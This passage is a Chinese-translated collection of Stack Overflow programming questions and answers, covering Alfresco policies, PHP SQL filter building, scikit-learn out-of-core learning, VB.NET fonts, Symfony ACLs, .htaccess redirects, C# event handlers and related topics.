    new JavaBehaviour(this, QNAME.toPrefixString(), NotificationFrequency.EVERY_EVENT)
); 
```

PublishModel.pubWebContent 是我的自定义内容类型的 qname。现在我想当 onDeleteAssociation() 被调用时，我应该检查哪个关联被删除了。但是在删除关联之后永远不会调用此方法:(。如何设置此策略？我应该提供 PublishModel.pubMyAssociation 而不是 PublishModel.pubWebContent （这也不起作用）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-19T09:29:55.970

我用谷歌搜索了一下，发现了[一段工作代码](https://code.google.com/p/fme-alfresco-extensions/source/browse/branches/pre-4.x/fme+extended+Datalist+-+Repository/src/java/de/fme/alfresco/repo/policy/DataListItemPolicies.java?r=153)，这有助于我使该政策生效。关键是使用**bindAssociationBehavior**而不是 bindClassBehavior 方法。所以工作binging应该是这样的：

```
policyComponent.bindAssociationBehaviour(
    QNAME,
    PublishModel.pubWebContent,
    PublishModel.pubGroupAssociation,
    onDeleteAssociation
); 
```

# php - 动态参数 JSON 到 PHP 中的 WHERE

> ID：12460071
> 
> 赞同：0
> 
> 时间：2012-09-17T13:18:43.380
> 
> 标签：php, sql, arrays, json, object

我有 JSON 响应请求，并希望从它们中创建一个变量 $Where，这是 JSON 模式：

```
"filter":
{"filters":[
    {"logic":"and","filters":[
        {"field":"NAMA","operator":"eq","value":"Rahmat"},
        {"field":"NAMA","operator":"eq","value":"Rosadi"}
    ]},{"logic":"or","filters":[
        {"field":"NIPK","operator":"eq","value":"1919191919"},
        {"field":"NIPK","operator":"eq","value":"818181818181"}
    ]},{"logic":"and","filters":[
        {"field":"JK","operator":"eq","value":"P"},
        {"field":"JK","operator":"eq","value":"L"}
    ]}
],
"logic":"and"} 
```

谁能告诉我如何使这种模式像这样单行 PHP 变量：

```
$Where = "(NAMA = 'Rahmat' or NAMA = 'Rosadi') and (NIPK = '1919191919' or NIPK != '818181818181') and (JK='P' AND JK='L')" 
```

对不起，我的英语不好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:42:26.817

您可以将列表枚举`filters`到 PHP 数组中，将它们中的每一个构建为 SQL OR 值的列表，然后使用 ; 将它们连接起来`implode(' OR ', ...)`。并进一步将数组内爆到“ AND ”子句列表中。

但是，这种方法失去了 JSON 设置所允许的大部分灵活性；它可以扩展到`AND`- 子句`OR`或单个子句的列表，并且可能`OR`使用语法合并同一字段的子句`IN`，但仅此而已。

您可以查看从 RPN 表示法转换为代数的算法，以寻找更强大（尽管更复杂）的方法。

简单的版本是

```
$ops = array(
    'eq' => '=',
    'ne' => '!=',
    'gt' => '>',
    'lt' => '<',
    'ge' => '>=',
    'le' => '<=',
    // CHECK THIS OUT, FIX & COMPLETE
);

$arr_Filters = array();
foreach($filters as $filter)
{
    /* $filter is a set of subfilters:
       {"logic":"and","filters":[
          {"field":"NAMA","operator":"eq","value":"Rahmat"},
         {"field":"NAMA","operator":"eq","value":"Rosadi"}
       ]},
       which we see as:
    */
    $logic = $filter['logic'];
    $arr_Filter  = array();
    foreach($filter['filters'] as $fov)
    {
        $op_f = $fov['operator'];
        $op   = $ops[$op_f];
        $value = /* FUNCTION TO SQL ESCAPE A VALUE */ $fov['value'];
        $value = is_numeric($value) ? $value : "'".$value."'";
        $arr_Filter[] = "$fov[field] $op $value";
    }
    $arr_Filters[] = '('.implode(' ' . $filter['logic'] . ' ', $arr_Filter).')';
}
$sql_filter = 'WHERE ' . implode(' AND ', $arr_Filters); 
```

可以检索使用`json_decode()`可以这样操作的对象：

```
// ($ops omitted, same as above)

$arr_Filters = array();
foreach($filters->filter->filters as $filter)
{
    /* $filter is a set of subfilters:
       {"logic":"and","filters":[
          {"field":"NAMA","operator":"eq","value":"Rahmat"},
         {"field":"NAMA","operator":"eq","value":"Rosadi"}
       ]},
       which we see as:
    */
    $logic = $filter->logic;
    $arr_Filter  = array();
    foreach($filter->filters as $fov)
    {
        $op_f = $fov->operator;
        $op   = $ops[$op_f];
        $value = /* FUNCTION TO SQL ESCAPE A VALUE */ $fov->value;
        $value = is_numeric($value) ? $value : "'".$value."'";
        $arr_Filter[] = "{$fov->field} $op $value";
    }
    $arr_Filters[] = '('.implode(' ' . $filter->logic . ' ', $arr_Filter).')';
}
$sql_filter = 'WHERE ' . implode(' ' . $filters->filter->logic . ' ', $arr_Filters); 
```

# scikit-learn - 可以使用 sklearn 对大数据文件应用在线算法吗？

> ID：12460077
> 
> 赞同：23
> 
> 时间：2012-09-17T13:18:56.770
> 
> 标签：scikit-learn, online-algorithm, large-data

我想在大文本语料库上应用快速的在线降维技术，例如（在线/小批量）字典学习。我的输入数据自然不适合内存（这就是我想使用在线算法的原因）所以我正在寻找一种可以迭代文件而不是将所有内容加载到内存中的实现。可以用 sklearn 做到这一点吗？有替代品吗？

感谢注册

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-09-17T14:00:45.720

对于一些支持 的算法`partial_fit`，可以在脚本中编写一个外循环来进行核外的大规模文本分类。然而，有一些缺失的元素：一个数据集读取器，它将磁盘上的数据作为平面文件的文件夹或 SQL 数据库服务器进行迭代，或 NoSQL 存储或具有存储字段的 Solr 索引。我们还缺少在线文本矢量化器。

这是一个示例集成模板，用于解释它如何组合在一起。

```
import numpy as np
from sklearn.linear_model import Perceptron

from mymodule import SomeTextDocumentVectorizer
from mymodule import DataSetReader

dataset_reader = DataSetReader('/path/to/raw/data')

expected_classes = dataset_reader.get_all_classes()  # need to know the possible classes ahead of time

feature_extractor = SomeTextDocumentVectorizer()
classifier = Perceptron()

dataset_reader = DataSetReader('/path/to/raw/data')

for i, (documents, labels) in enumerate(dataset_reader.iter_chunks()):

    vectors = feature_extractor.transform(documents)
    classifier.partial_fit(vectors, labels, classes=expected_classes)

    if i % 100 == 0:
        # dump model to be able to monitor quality and later analyse convergence externally
        joblib.dump(classifier, 'model_%04d.pkl' % i) 
```

数据集阅读器类是特定于应用程序的，可能永远不会进入 scikit-learn（除了可能不需要向库添加新依赖项的平面文本文件或 CSV 文件的文件夹）。

文本矢量化部分问题更大。`partial_fit`由于我们构建内存词汇表的方式（根据 max_df 和 min_df 修剪的 python dict），当前的矢量化器没有方法。我们也许可以使用外部存储构建一个并删除 max_df 和 min_df 功能。

或者，我们可以构建一个 HashingTextVectorizer，它使用散列技巧来删除字典要求。目前这些都不存在（尽管我们已经有了一些构建块，例如 murmurhash 包装器和散列功能的拉取请求）。

同时，我建议你看看[Vowpal Wabbit](https://github.com/JohnLangford/vowpal_wabbit/wiki)和[那些 python 绑定](https://github.com/shilad/PyVowpal)。

**编辑：**该类`sklearn.feature_extraction.FeatureHasher`已合并到 scikit-learn 的主分支中，将在下一个版本（0.13）中可用。查看有关[特征提取](http://scikit-learn.org/dev/modules/feature_extraction.html)的文档。

**编辑 2：** 0.13 现已发布`FeatureHasher`，`HashingVectorizer`可以直接处理文本数据。

**编辑 3：**现在在项目的官方示例库中[有一个使用 Reuters 数据集进行核外学习的示例。](http://scikit-learn.org/dev/auto_examples/applications/plot_out_of_core_classification.html#example-applications-plot-out-of-core-classification-py)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-05-22T08:41:26.290

由于 Sklearn 0.13 确实存在[HashingVectorizer](http://scikit-learn.org/stable/modules/feature_extraction.html#hashing-vectorizer)的实现。

**编辑：**这是[此类应用程序的完整示例](http://scikit-learn.org/stable/auto_examples/applications/plot_out_of_core_classification.html)

基本上，这个例子展示了你可以学习（例如分类文本）不能放入计算机主存储器（而是磁盘/网络/...）的数据。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-18T11:52:55.733

In addition to [Vowpal Wabbit](http://hunch.net/~vw/), [gensim](http://radimrehurek.com/gensim/) might be interesting as well - it too features online Latent Dirichlet Allocation.

# visual-studio-2010 - 如何在 Visual Basic 中为文本添加下划线（使用 Visual Studio 2010）

> ID：12460079
> 
> 赞同：5
> 
> 时间：2012-09-17T13:19:04.727
> 
> 标签：visual-studio-2010, vba

在 Visual Basic 中按下按钮后，我遇到了下划线文本的问题。我正在使用 Visual Studio 2010，我在教程中使用红色按钮方法，例如我必须使用：

```
lbltext.FontUnderline = True 
```

但我没有变量“FontUnderline”。当然，我试图找到其他变量或函数来做到这一点，但没有成功。任何人都知道如何在 Visual Studio 中执行此操作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2017-07-21T21:17:42.527

内联答案如下所示：

```
Me.lbltext.Font =  New Font(lbltext.Font, FontStyle.Underline) 
```

这将节省多行代码。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T13:26:51.870

Or the old way of doing it was to instance a new font

```
Font standardFont = new Font(lblText.Font)
Font underFont = new Font(standardFont,FontStyle.Underline) 
```

Then just set the Font property of the relevant controls to the one you want.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-05-31T08:22:47.337

以@Tony Hopkinson 为例并添加了一些小改动以使其适用于 VB.NET

所以这是 VB.NET 的语法

```
Dim standardFont As Font = lblExportDate.Font
Dim underFont As New Font(standardFont, FontStyle.Underline)

Me.lblExportDate.Font = underFont 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-17T13:21:41.813

我认为您在这里遗漏了一个点。

它应该是`lbltext.Font.Underline = true`

# php - ACL ROLE_ADMIN 不起作用

> ID：12460083
> 
> 赞同：3
> 
> 时间：2012-09-17T13:19:12.253
> 
> 标签：php, security, symfony, acl

也许这里有人可以帮助我。我正在添加博客评论并添加权限。

*   创建博客的用户的权限是正常的。
*   未登录用户的权限可以查看评论，这样就可以了。
*   管理员无法编辑/删除评论...但是怎么了？

部分控制器代码：

```
// Creating the ACL
$aclProvider = $this->get('security.acl.provider');
$objectIdentity = ObjectIdentity::fromDomainObject($blogComment);
$acl = $aclProvider->createAcl($objectIdentity);

// Creating full access for the admin
$roleSecurityIdentity = new RoleSecurityIdentity('ROLE_ADMIN');
$acl->insertObjectAce($roleSecurityIdentity, MaskBuilder::MASK_MASTER );

// Creating view rights for the not-logged in users
$roleSecurityIdentity = new RoleSecurityIdentity('IS_AUTHENTICATED_ANONYMOUSLY');
$acl->insertObjectAce($roleSecurityIdentity, MaskBuilder::MASK_VIEW );

// retrieving the security identity of the currently logged-in user
$securityContext = $this->get('security.context');
$user = $securityContext->getToken()->getUser();
$securityIdentity = UserSecurityIdentity::fromAccount($user);

// grant owner access
$acl->insertObjectAce($securityIdentity, MaskBuilder::MASK_OWNER);
$aclProvider->updateAcl($acl); 
```

Symfony 分析器安全性

```
Username    Mitchel
Authenticated?  yes
Roles   [ROLE_ADMIN] 
```

数据库转储：

```
-- phpMyAdmin SQL Dump
-- version 3.5.2.2
-- http://www.phpmyadmin.net
--
-- Machine: localhost
-- Genereertijd: 17 sep 2012 om 14:19
-- Serverversie: 5.1.65
-- PHP-versie: 5.3.16

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `acl_classes`
--

CREATE TABLE IF NOT EXISTS `acl_classes` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `class_type` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UNIQ_69DD750638A36066` (`class_type`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Gegevens worden uitgevoerd voor tabel `acl_classes`
--

INSERT INTO `acl_classes` (`id`, `class_type`) VALUES
(1, 'MV\\BetaalbaarkozijnBundle\\Entity\\BlogComment');

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `acl_entries`
--

CREATE TABLE IF NOT EXISTS `acl_entries` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `class_id` int(10) unsigned NOT NULL,
  `object_identity_id` int(10) unsigned DEFAULT NULL,
  `security_identity_id` int(10) unsigned NOT NULL,
  `field_name` varchar(50) DEFAULT NULL,
  `ace_order` smallint(5) unsigned NOT NULL,
  `mask` int(11) NOT NULL,
  `granting` tinyint(1) NOT NULL,
  `granting_strategy` varchar(30) NOT NULL,
  `audit_success` tinyint(1) NOT NULL,
  `audit_failure` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UNIQ_46C8B806EA000B103D9AB4A64DEF17BCE4289BF4` (`class_id`,`object_identity_id`,`field_name`,`ace_order`),
  KEY `IDX_46C8B806EA000B103D9AB4A6DF9183C9` (`class_id`,`object_identity_id`,`security_identity_id`),
  KEY `IDX_46C8B806EA000B10` (`class_id`),
  KEY `IDX_46C8B8063D9AB4A6` (`object_identity_id`),
  KEY `IDX_46C8B806DF9183C9` (`security_identity_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

--
-- Gegevens worden uitgevoerd voor tabel `acl_entries`
--

INSERT INTO `acl_entries` (`id`, `class_id`, `object_identity_id`, `security_identity_id`, `field_name`, `ace_order`, `mask`, `granting`, `granting_strategy`, `audit_success`, `audit_failure`) VALUES
(1, 1, 1, 1, NULL, 0, 128, 1, 'all', 0, 0),
(2, 1, 1, 2, NULL, 1, 1, 1, 'all', 0, 0),
(3, 1, 1, 3, NULL, 2, 64, 1, 'all', 0, 0);

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `acl_object_identities`
--

CREATE TABLE IF NOT EXISTS `acl_object_identities` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `parent_object_identity_id` int(10) unsigned DEFAULT NULL,
  `class_id` int(10) unsigned NOT NULL,
  `object_identifier` varchar(100) NOT NULL,
  `entries_inheriting` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UNIQ_9407E5494B12AD6EA000B10` (`object_identifier`,`class_id`),
  KEY `IDX_9407E54977FA751A` (`parent_object_identity_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Gegevens worden uitgevoerd voor tabel `acl_object_identities`
--

INSERT INTO `acl_object_identities` (`id`, `parent_object_identity_id`, `class_id`, `object_identifier`, `entries_inheriting`) VALUES
(1, NULL, 1, '1', 1);

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `acl_object_identity_ancestors`
--

CREATE TABLE IF NOT EXISTS `acl_object_identity_ancestors` (
  `object_identity_id` int(10) unsigned NOT NULL,
  `ancestor_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`object_identity_id`,`ancestor_id`),
  KEY `IDX_825DE2993D9AB4A6` (`object_identity_id`),
  KEY `IDX_825DE299C671CEA1` (`ancestor_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Gegevens worden uitgevoerd voor tabel `acl_object_identity_ancestors`
--

INSERT INTO `acl_object_identity_ancestors` (`object_identity_id`, `ancestor_id`) VALUES
(1, 1);

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `acl_security_identities`
--

CREATE TABLE IF NOT EXISTS `acl_security_identities` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `identifier` varchar(200) NOT NULL,
  `username` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UNIQ_8835EE78772E836AF85E0677` (`identifier`,`username`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

--
-- Gegevens worden uitgevoerd voor tabel `acl_security_identities`
--

INSERT INTO `acl_security_identities` (`id`, `identifier`, `username`) VALUES
(2, 'IS_AUTHENTICATED_ANONYMOUSLY', 0),
(1, 'MV\\BetaalbaarkozijnBundle\\Entity\\User-User', 1),
(3, 'ROLE_ADMIN', 0);

--
-- Beperkingen voor gedumpte tabellen
--

--
-- Beperkingen voor tabel `acl_entries`
--
ALTER TABLE `acl_entries`
  ADD CONSTRAINT `FK_46C8B8063D9AB4A6` FOREIGN KEY (`object_identity_id`) REFERENCES `acl_object_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  ADD CONSTRAINT `FK_46C8B806DF9183C9` FOREIGN KEY (`security_identity_id`) REFERENCES `acl_security_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  ADD CONSTRAINT `FK_46C8B806EA000B10` FOREIGN KEY (`class_id`) REFERENCES `acl_classes` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- Beperkingen voor tabel `acl_object_identities`
--
ALTER TABLE `acl_object_identities`
  ADD CONSTRAINT `FK_9407E54977FA751A` FOREIGN KEY (`parent_object_identity_id`) REFERENCES `acl_object_identities` (`id`);

--
-- Beperkingen voor tabel `acl_object_identity_ancestors`
--
ALTER TABLE `acl_object_identity_ancestors`
  ADD CONSTRAINT `FK_825DE2993D9AB4A6` FOREIGN KEY (`object_identity_id`) REFERENCES `acl_object_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  ADD CONSTRAINT `FK_825DE299C671CEA1` FOREIGN KEY (`ancestor_id`) REFERENCES `acl_object_identities` (`id`) ON DELETE CASCADE ON UPDATE CASCADE; 
```

我还在[symfony](http://forum.symfony-project.org/viewtopic.php?f=23&t=46874)论坛上创建了一个主题，但似乎它们不像 stackoverflow 那样活跃；）

Symfony 版本：2.1.2

Thnx，问候米切尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-30T07:54:32.580

您是否尝试过按用户分配角色

```
# Object
$idObjeto = ObjectIdentity::fromDomainObject($blogComment);

# User
$idUsuario = UserSecurityIdentity::fromAccount($usuario);

try {
    $acl = $this->get('security.acl.provider')->findAcl($idObjeto);
} catch (\Symfony\Component\Security\Acl\Exception\AclNotFoundException $e) {
    $acl = $this->get('security.acl.provider')->createAcl($idObjeto);
}

$acl->insertObjectAce($idUsuario, MaskBuilder::MASK_OPERATOR);
$this->get('security.acl.provider')->updateAcl($acl); 
```

# java - WAV 到 MP3 - Java 库示例

> ID：12460084
> 
> 赞同：0
> 
> 时间：2012-09-17T13:19:13.287
> 
> 标签：java, mp3, wav, javasound, lame

有没有关于如何使用 LameOnJ、Pure Java Mp3 Encoder 等在 java 中将 WAV 格式编码为 MP3 的示例？示例代码，教程任何东西都会很棒！

我现在对图书馆很困惑。尝试了 Tritonus lib，但它给了我：

```
Error: Unsupported conversion: MPEG1L3 from PCM_SIGNED 44100.0 Hz, 16 bit, stereo, 4 bytes/frame, little-endian 
```

也许那是因为我使用 Mac OS - 但我遵循 Linux 指令，因为没有可用的 MAC 指令？！有什么建议么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T13:22:20.503

作为替代方案，使用[**JAVE** ( **J** ava **A udio** **V** ideo **E** ncoder ) 库](http://www.sauronsoftware.it/projects/jave/)：

> JAVE（Java 音频视频编码器）库是 ffmpeg 项目的 Java 包装器。开发人员可以利用 JAVE 将音频和视频文件从一种格式转码为另一种格式。例如，您可以将 AVI 文件转码为 MPEG 文件，可以将 DivX 视频流更改为（类似 youtube）的 Flash FLV 文件，**可以将 WAV 音频文件转换为 MP3**或 Ogg Vorbis 文件，您可以分离和转码音频和视频轨道，您可以调整视频大小，更改其大小和比例等。JAVE 支持许多其他格式、容器和操作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-27T08:55:49.880

在 Java 版 Java 网站上：

JAVE 不是纯 Java：它充当 ffmpeg (http://ffmpeg.mplayerhq.hu/) 可执行文件的包装器。ffmpeg 是一个完全用 C 语言编写的开源和免费软件项目，因此它的可执行文件不能轻易地从一台机器移植到另一台机器。您需要 ffmpeg 的预编译版本才能在目标机器上运行 JAVE。JAVE 发行版包括两个预编译的 ffmpeg 可执行文件：一个 Windows 和一个 Linux，均针对 i386/32 位硬件架构进行编译。在大多数情况下，这应该足够了。如果对于您的具体情况还不够，您仍然可以运行 JAVE，但您需要获取平台特定的 ffmpeg 可执行文件 :)

# apache - url 重写动态 url 重定向 - Magento

> ID：12460090
> 
> 赞同：0
> 
> 时间：2012-09-17T13:19:46.910
> 
> 标签：apache, .htaccess, mod-rewrite, redirect

我正在寻找执行以下操作的 htaccess 行

将旧的现有 url 重定向到新 url (301)

示例 www.example.com/categorya/categoryb/product.htm

到

www.example.com/product.htm

可以有更多类别部分，也可以更少，这一切都必须转到 /product.htm (Magento)。

谁能帮忙？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T16:29:50.477

尝试将这些规则放在文档根目录的 htaccess 文件中，最好放在您可能已经拥有的任何规则之上：

```
RewriteEngine On
RewriteRule ^(.+)/product.htm$ /product.htm [L,R=301] 
```

* * *

尝试：

```
RewriteEngine On
RewriteRule ^[^/]+/[^/]+/([^.]+)\.htm$ /$1.htm [L,R=301] 
```

# sql - 使用基于 SQL Server 上同一表的视图中的计算值更新表

> ID：12460092
> 
> 赞同：1
> 
> 时间：2012-09-17T13:20:02.217
> 
> 标签：sql, sql-server, sql-server-2008

我有一张桌子

tbl当前：

```
 Ref  |   . .... .  . . |  Total A   |   Total B
 A001  |                 |    NULL    |     NULL
 A002  |                 |    NULL    |     NULL
 A003  |                 |    NULL    |     NULL
 A004  |                 |    NULL    |     NULL 
```

我创建了一个视图，该视图`vwCurrentB`提供了在同一个表中满足特定条件的记录计数。

如何更新字段`Total A`和`Total B`视图中的相关值。表和视图都将具有完全相同数量的记录，其中 Ref 是唯一键。我只需要将视图中的额外两列，放入表中各自的记录中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:23:11.340

```
update tc
set TotalA = v.TotalA
   ,TotalB = v.TotalB
from tblCurrent tc
join vwCurrentB v on tc.Ref = v.Ref 
```

# c# - 如何将多个文本框中的文本更改事件连接到单个方法（C#）？

> ID：12460096
> 
> 赞同：2
> 
> 时间：2012-09-17T13:20:19.900
> 
> 标签：c#, winforms

当我双击设计中的文本框时，它会自动为我创建一个方法。因为我希望在任何情况下都发生相同的事情，所以我只需从每个情况下调用一个辅助方法，如下面的代码所示。

```
private void TextBox_1_TextChanged(object sender, EventArgs e)
{
  TextChanged();
}

private void TextBox_2_TextChanged(object sender, EventArgs e)
{
  TextChanged();
}

private void TextChanged(object sender, EventArgs e) { ... } 
```

现在我想知道是否有办法（除了进入我的设计文件（根据其中的信息，不应该尝试）将动作侦听器连接到相同的方法并通过以下方式跳过弯路自动生成的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:26:28.150

I usually proceed like this in my projects, *if* controls are not going to change at runtime (i.e. if all controls in the form are added at design time):

```
// this is the container's ctor
public MyForm()
{
    TextBox1.TextChanged += new EventHandler(UniqueHandler);
    TextBox2.TextChanged += new EventHandler(UniqueHandler);
    ...
    TextBoxN.TextChange += new EventHandler(UniqueHandler);
}

void UniqueHandler(object sender, EventArgs e)
{
    TextBox source = (sender as TextBox);
    // handle the event!
} 
```

If controls *will* change, it's actually quite similar, it just doesn't happen in the ctor but on-site:

```
// anywhere in the code
TextBox addedAtRuntime = new TextBox();
addedAtRuntime.TextChanged += new EventHandler(UniqueHandler);
MyForm.Controls.Add(addedAtRuntime);
// code goes on, the new textbox will share the handler 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T13:21:46.210

在设计器页面上，转到事件选项卡，找到您要查找的事件 (TextChanged)，然后手动输入您希望它们全部使用的事件处理程序的名称。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T13:27:47.760

在属性折叠中（通常在屏幕右侧），您应该有一个雷声图标。这就是所有事件都可以参考的地方。

如果您没有看到属性，请选择相关组件（在您的情况下为文本框），右键单击它并在上下文菜单中选择“属性”。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T13:25:27.763

You can do it by this way:

```
 void btn1_onchange(object sender, EventArgs e)
  {
    MessageBox.Show("Number One");
  }

  void btn1_onchange2(object sender, EventArgs e){
    MessageBox.Show("Number Two");
  }

  public MyForm() {

    Button btn1 = new Button();
    btn1.Text = "Click Me";
    this.Controls.Add(btn1);

    btn1.TextChange += new EventHandler(btn1_onchange);
    btn1.TextChange += new EventHandler(btn1_onchange2);
  } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-17T13:42:57.673

您可以在设计器视图中执行此操作。而不是双击一个元素 - 转到按钮的属性，选择事件选项卡，然后为足够的事件输入适当的处理程序名称。瞧！

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-09-17T13:29:03.017

按着这些次序：

1.  转到 InitializeComponent()。
2.  每个文本框都附加了三个事件。

在那里你应该能够看到以下内容。

```
this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
this.textBox2.TextChanged += new System.EventHandler(this.textBox2_TextChanged); 
```

将此替换为

```
this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
this.textBox2.TextChanged += new System.EventHandler(this.textBox1_TextChanged); 
```

然后去掉下面的方法

```
private void TextBox_2_TextChanged(object sender, EventArgs e)
{
  TextChanged();
} 
```

# entity-framework-4.1 - 如何对复合对象中的记录进行排序？

> ID：12460097
> 
> 赞同：1
> 
> 时间：2012-09-17T13:20:23.953
> 
> 标签：entity-framework-4.1, wcf-ria-services, silverlight-5.0

假设我在 DB 中有 2 个表：Student、StudentCourse。

在 Student 的元数据中，将 StudentCourse 设置为 Composite：

```
[Include]
[Composition]
public EntityCollection<StudentCourse> StudentCourses { get; set; } 
```

在 Student 的域服务中，包括 StudentCourse，例如：

```
public IQueryable<Student> GetStudentByID(int id)
{
   reutrn this.ObjectContext.Students.Include("StudentCourse").Where(s => s.ID == id) as IQueryable<Student>;
} 
```

问题是：我希望StudentCourse的记录可以按StudentCourses中的一列排序，例如CourseID。

一个学生下的StudentCourse记录实际上是StudentCourse的一个实体集合。

如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T06:52:37.933

即使在普通的 SQL 中，您所要求的也是不可能的。您可以尝试您的提供商是否会支持类似的东西

```
this.ObjectContext.Students.Include("StudentCourse").Where(s => s.ID == id).OrderBy(x=> x.StudentCourse.First().CourseId) as IQueryable<Student> 
```

# c# - 基于行 c# 读取 csv 文件

> ID：12460100
> 
> 赞同：1
> 
> 时间：2012-09-17T13:20:27.887
> 
> 标签：c#

是否可以根据行读取 csv 文件。就像给出一个行号，它会在 CSV 中检索该特定行。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:30:39.937

如果您只想读取一行文本文件（如 csv），最简单的方法是使用[`File.ReadLines`](http://msdn.microsoft.com/en-us/library/dd383503.aspx)and [`Enumerable.ElementAtOrDefault`](http://msdn.microsoft.com/en-us/library/bb494386.aspx)：

```
public static String getFileLine(String path, int indexOfLine)
{
    return File.ReadLines(path).ElementAtOrDefault(indexOfLine);
} 
```

以这种方式使用它：

```
String line = getFileLine(@"C:\Temp\CsvFile.csv", 99); 
```

这将返回第 100 行（或者`null`如果少于 100 行）。

这是另一个返回一系列行的类似方法：

```
public static IEnumerable<String> getFileLines(String path, IEnumerable<int> lineIndices)
{
    return File.ReadLines(path).Where((l, i) => lineIndices.Contains(i));
} 
```

返回前 10 行：

```
IEnumerable<int> range = Enumerable.Range(0,10);
IEnumerable<String> lines = getFileLines(@"C:\Temp\CsvFile.csv", range);
foreach (String line in lines)
    Console.WriteLine(line); 
```

请注意，`File.ReadLines`它类似于 a `StreamReader`，它不会一次将整个文件读入内存（as [`FileReadAllLines`](http://msdn.microsoft.com/en-us/library/s2tte0y1.aspx)），只是尽可能多地读取。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:23:57.273

请使用`System.IO.StreamReader`and`System.IO.StreamWriter`将用于读取和写入 csv 文件。他们有`ReadLine()`和`WriteLine()`方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:26:19.550

这取决于你在这里的目标，但你可能应该做类似的事情

```
 while((line = readFile.ReadLine()) != null)
   {
   //Record line
   } 
```

然后，一旦您将文件数据读入内存，您就可以考虑按行查询。

顺便说一句，你真的应该考虑用谷歌搜索这个，即使是 Bing'ing 它也会给你一个答案。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T13:30:51.607

如果您的文件不是很大，您可以这样做：

```
string line10 = File.ReadAllLines(@"<filename>", Encoding.Default).ElementAt(10); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-17T13:32:07.430

不确定您的动机是什么-如果是性能，请考虑使用一些数据库...CSV不是数据库，它只是一个大文件...要读取特定的行号，您需要阅读所有前面的行（尽管您不需要完全解析它们）...或将整个文件读入内存[`File.ReadAllLines`](http://msdn.microsoft.com/en-us/library/system.io.file.readalllines.aspx)- 这为您提供了一个`string[]`您可以在任何您想要的行访问的文件...或使用[`File.ReadLines`](http://msdn.microsoft.com/en-us/library/system.io.file.readlines.aspx)它为您`IEnumerable<string>`提供可能更节省内存/大文件性能...

# objective-c - 如何知道coredata没有加载故障？

> ID：12460101
> 
> 赞同：0
> 
> 时间：2012-09-17T13:20:29.197
> 
> 标签：objective-c, xcode4.3

我从网上抓取数据，然后将其保存在 coredata 中。并非所有数据都必须创建新的。如果数据与之前存储的数据相同，那么我们使用旧数据。

为了加快保存过程，我预取了旧数据。

事实证明它仍然很慢。保存过程仍然很慢。

我怀疑核心数据在预取后再次导致 IO 跳闸。

我们怎么知道它是否再次发生？我们可以在“IO”旅行中休息一下吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:57:43.470

要监控 Core Data/SQLite 活动，您可以

*   转到“Edit Scheme ...”并将“-com.apple.CoreData.SQLDebug 1”添加到“Arguments Passed on Launch”。然后您将获得所有 SQLite 操作的控制台输出。
*   使用 Instruments 和“核心数据”工具分析您的应用程序。

# r - 根据它们的关系对 r 中的对象进行排序

> ID：12460110
> 
> 赞同：4
> 
> 时间：2012-09-17T13:21:03.143
> 
> 标签：r, dataframe, permutation

